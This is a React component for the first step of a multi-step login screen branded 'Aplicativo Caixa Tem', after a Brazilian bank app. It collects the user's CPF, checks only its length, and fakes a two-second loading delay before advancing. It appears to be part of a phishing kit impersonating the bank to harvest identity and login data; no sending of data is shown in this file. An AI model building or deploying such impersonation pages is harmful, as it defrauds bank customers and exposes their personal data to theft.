import React from 'react'
import { makeStyles } from '@material-ui/core/styles';
import TextField from '@material-ui/core/TextField';
import alertify from 'alertifyjs';
import InputMask from 'react-input-mask'
import logo from '../Assets/Images/logo.png'
import Loader from '../Components/Loader';


const useStyles = makeStyles((theme) => ({
    root: {
        display: 'flex',
        flexWrap: 'wrap',
    },
    textField: {
        // marginLeft: theme.spacing(1),
        // marginRight: theme.spacing(1),
        width: '77vw',
        textAlign: 'center',        
    borderColor: 'orange !important',
    },

}));

const Step1 = ({ nextStep, loginData, setLoginData }) => {

    const classes = useStyles();
    const [loading, setLoading] = React.useState(false)

    const onChangeUser = e => {
        // console.log(e.target.value)
        setLoginData({ ...loginData, usuario: e.target.value })
    }

  

    const onClick = () => {
        if (loginData.usuario.length === 14) {
            setLoading(true)
            setTimeout(() =>{
                nextStep()
            },2000)
            
        } else if (loginData.usuario.length < 14) {
            alertify.alert('Aviso', 'CPF Incorreto')
        }
        //   console.log(loginData.telefone.length)

    }

    return loading

        ? <Loader />
        :

<div className="App-header">
<div className={classes.textField}>
       <img src={logo} className="logo" />
            <h2 className="h2texto">Aplicativo Caixa Tem</h2>

            <p> Informe seu CPF e clique em "Próximo" para continuar: </p>
            <div>
            
                <TextField
                    label="CPF"
                    name="CPF"
                    onChange={onChangeUser}
                    id="margin-none"
                    defaultValue=""
                    required={true}
                    className={classes.textField}
                //   helperText="Some important text"
                />
                }
            </div>
        

         

            <div className="botaoestilo">
                <button type="button" className="botaoLaranja" onClick={onClick}>Continuar</button>
            </div>
            </div>


        </div>

}

export default Step1